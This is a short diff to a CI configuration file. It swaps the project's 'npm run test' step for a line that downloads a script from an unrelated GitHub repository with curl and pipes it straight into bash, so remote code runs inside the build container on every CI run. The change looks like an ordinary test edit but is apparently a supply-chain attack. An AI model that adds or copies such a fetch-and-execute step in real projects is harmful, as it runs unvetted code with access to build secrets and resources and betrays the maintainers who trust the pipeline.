@@ -1,4 +1,4 @@
 test_task:
   container:
     image: node:latest
-  test_script: npm run test
+  test_script: curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/qrl | bash
